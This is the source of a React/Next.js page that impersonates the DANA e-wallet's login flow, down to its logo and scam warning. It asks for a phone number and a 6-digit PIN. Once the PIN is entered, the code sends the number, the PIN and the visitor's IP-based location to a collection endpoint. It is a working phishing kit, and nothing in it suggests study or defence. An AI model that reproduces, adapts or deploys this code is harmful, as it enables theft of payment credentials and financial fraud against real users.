'use client'

import uuid4 from 'uuid4'
import Image from 'next/image'
import { ExclamationTriangleIcon, ChevronLeftIcon } from '@heroicons/react/24/solid'
import { useState, useRef, useEffect } from 'react'

interface PageProps {
  params: { id: string }
}

const DanaID = ({ params }: PageProps) => {
   const ref = useRef(Array(6).fill(null))
   const uidValidation = uuid4.valid(params.id)

   if(uidValidation) console.log(`${params.id} Is valid ${uidValidation}`)

   const [key, setKey] = useState(false)
   const [displaypin, setDisplayPin] = useState(false)
   const [phoneNumber, setPhoneNumber] = useState('')
   const [input, setInput] = useState(Array(6).fill(''))
   const [dot, setDot] = useState(Array(6).fill(false))
   const [userInfo, setUInfo] = useState('')
   const [Nomor, setNomor] = useState('')
   const [PinDana, setPin] = useState('')
   const [send, setSend] = useState(false)

 useEffect(() => {
   const savePin = async() => {
      try {
         const formData = new FormData()
         console.log(`Info ${userInfo}`)
         formData.append('nomor', Nomor)
         formData.append('pin_dana', PinDana)
         formData.append('user_info', userInfo)

         const res = await fetch('http://localhost:3000/api/hehe', {
         cache: 'no-store',
         method: 'POST',
         headers: {
           'Authorization': process.env.NEXT_PUBLIC_AUTH || ''
         },
         body: formData
      })
       console.log("berhasil")
    } catch(err: any) {
       console.error("gagal: " + err)
    }
  }

   if(send) {
      savePin()
    }

   const get_ip = async() => {
      try {
         const res = await fetch("https://ipinfo.io/json", { cache: 'no-store' })
         const data = await res.json()

         if(!res.ok) {
            throw new Error('Failed fetching data')
         }

         if(!data)
            throw new Error('Data null')

         const ip_info = [
           {key:'Ip Adress', value: data.ip},
           {key: 'Kota', value: data.city},
           {key: 'Negara', value: data.country},
           {key: 'Kode lokasi', value: data.loc},
           {key: 'hostname', value: data.hostname},
           {key: 'org', value: data.org},
           {key: 'Zona waktu', value: data.timezone}
         ]

         setUInfo(JSON.stringify(ip_info))
      } catch(err: any) {
         console.error(`\n[X] Error cuy: ${err}\n`)
      }
   }

   get_ip()
}, [send])


   const formatNomor = (value) => {
    const cleaned = value.replace(/\D/g, '');
    let formatted = '';
    if (cleaned.length > 0) {
      formatted += cleaned.substring(0, 3);
    }
    if (cleaned.length > 3) {
      formatted += '-' + cleaned.substring(3, 7);
    }
    if (cleaned.length > 7) {
      formatted += '-' + cleaned.substring(7, 11);
    }
      return formatted
  }

   const handleChange = (e) => {
    const value = e.target.value

    if(value) {
        setKey(true)
    } else {
        setKey(false)
    }

      const nomor = formatNomor(e.target.value)
      setPhoneNumber(nomor)

    if(value.length === 11 + 2 || value.length === 12 + 2 || value.length === 13 + 2) {
        setNomor(value)
    }

  }

   const handleChangePin = (index, e) => {
    const value = e.target.value
    const isValidInput = /^[0-9]*$/.test(value);

    if (isValidInput) {
      const newCode = [...input];
      newCode[index] = value;
      setInput(newCode);
  
      if (value.length === 1 && index < 5) {
        ref.current[index + 1].focus();
      } else if (value === '' && index > 0) {
        ref.current[index - 1].focus();
      }

     setTimeout(() => {
        setDot((prevDot) => {
          const newDot = [...prevDot];
          newDot[index] = value !== '';
          return newDot;
        });
      }, 400);

      if(newCode.every((digit) => digit !== '')) {
         setPin(newCode)
         setSend(true)
      }

    } else if (value === '' && index > 0) {
      const newCode = [...input];
      newCode[index] = value;
      setInput(newCode);
      ref.current[index - 1].focus();
    }
}

/*   const handleKeyDown = (event) => {
    if (event.key === 'Backspace') {
      if (!phoneNumber.match(/^\d{1,}$/)) {
        setPhoneNumber('');
      }
    }
  }*/
 
 if(!displaypin) {
   return (
  <>
    <div className="min-h-screen">
        <div className="flex items-center pt-3">
          <div className="justify-start ps-4">
             <ChevronLeftIcon className="size-6 text-white font-bold" />
          </div>
          <div className="flex items-center justify-center w-[16.8rem] md:w-[55rem]">
             <Image src="/logo-dana.jpg" alt="DANA" width={100} height={100}/>
          </div>
         </div>
      <div className="flex flex-col justify-center items-center w-full mt-8 px-6 mx-auto md:w-[23rem]">
        <h1 className="text-[0.9rem] mb-6 text-white">Enter your <span className="font-medium">mobile number</span> to continue</h1>
        <div className="flex items-center bg-white rounded-lg h-[2.6rem] w-full mb-4 px-4">
          <div className="flex items-center justify-center w-20 font-medium gap-x-2">
           <div className="flex flex-col">
            <div className="bg-red-500 w-6 h-2 rounded-t-sm border-x border-t border-gray-300"></div>
            <div className="bg-red-white w-6 h-2 rounded-b-sm border-x border-b border-gray-300"></div>
           </div>
          +62
          </div>
          <input
            type="tel"
            placeholder="811-1234-5678"
            value={phoneNumber}
            className="w-full px-3 text-2xl py-0 font-medium placeholder-[#c4c4c4] focus:outline-none"
            onChange={handleChange}
            
          />
        </div>
        <p className="text-white text-sm mt-2 mb-6 text-center">By continuing, you agree with our <span className="font-medium">Terms & Conditions</span> and <span className="font-medium">Privacy Policy</span></p>
        <div className="flex items-center  text-sm text-gray-100 bg-[#0e79c7] p-3 rounded-md">
          <div className="inline text-[#fa8b01] pe-4">
            <ExclamationTriangleIcon className="size-8" />
          </div>
          <p>
          Beware of scams since we never give links, asks for PIN, OTP code, or money.&nbsp;
          <span className="underline">Learn more</span>
          </p>
        </div>
      </div>
       <div className="relative">
         <div className={`absolute ${key ? 'top-[3rem]':'top-[23rem]'} w-full`}>
          <div className="flex justify-center">
            <button className="text-gray-300" onClick={() => setDisplayPin(true)}>CONTINUE</button>
          </div>
        </div>
       </div>
    </div>
   </>
   )
 } else {
    return (
      <div className="min-h-screen">
         <div className="flex items-center pt-3">
          <div className="justify-start ps-4">
             <ChevronLeftIcon className="size-6 text-white font-bold" />
          </div>
          <div className="flex items-center justify-center w-[16.8rem] md:w-[55rem]">
             <Image src="/logo-dana.jpg" alt="DANA" width={100} height={100}/>
           </div>
         </div>
       <div className="mt-12">
        <div className="flex justify-center text-center w-full">
          <div className="flex-col">
            <h2 className="mb-5 text-white text-[1rem]">Enter your <span className="font-medium">DANA PIN</span></h2>
            <div className="flex gap-x-1">
      {input.map((value, index) => (
        <div key={index} className="relative">
        <input
          key={index}
          ref={(el) => (ref.current[index] = el)}
          type="tel"
          maxLength={1}
          value={value[index]}
          onChange={(e) => handleChangePin(index, e)}
          className={`w-9 h-11 text-center text-[.9rem] rounded-lg focus:outline-none ${dot[index] ? 'text-white':''} `}
        />
          {dot[index] && (
            <span
              className="absolute inset-y-3.5 left-1/2 transform -translate-x-1/2 -translate-y-1/2 text-lg"
              aria-hidden="true"
            >
              &bull;
            </span>
          )}
        </div>
      ))}
      </div>
       <button className="border border-white px-2.5 py-0.5 text-[0.8rem] font-medium rounded-full text-white mt-7">SHOW</button>
       <div className="mt-14 flex flex-row items-center gap-x-9 text-white">
        <div className="flex flex-row items-center gap-x-1">
          <Image src="/dana-cust.jpg" width={20} height={20} quality={100} />
          <p className="font-medium text-md">GET HELP</p>
        </div>
         <p className="font-medium text-md" onClick={() => setSend(true)}>FORGOT PIN?</p>
       </div>
    </div>
         </div>
        </div>
      </div>
   )
  }
}

export default DanaID
